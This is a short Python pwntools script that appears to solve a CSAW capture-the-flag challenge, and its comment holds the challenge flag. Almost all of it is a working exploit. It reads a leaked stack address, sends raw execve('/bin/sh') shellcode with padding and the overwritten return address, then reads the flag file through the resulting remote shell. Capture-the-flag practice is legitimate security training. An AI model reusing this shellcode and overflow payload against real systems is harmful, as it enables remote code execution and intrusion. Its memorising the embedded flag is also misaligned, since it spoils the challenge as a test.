#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}

host , port = 'pwn.chal.csaw.io' , 8464

y = remote(host,port)

y.recvuntil( 'Location:0x' )

loc = int( y.recvline().strip() , 16 )
log.success( 'Location -> {}'.format( hex( loc ) ) )


sc = '\x48\x31\xf6\x48\x31\xd2\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x6a\x3b\x58\x0f\x05'

p = sc + 'D' * ( 0x28 - len( sc ) ) + p64( loc )

y.send( p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()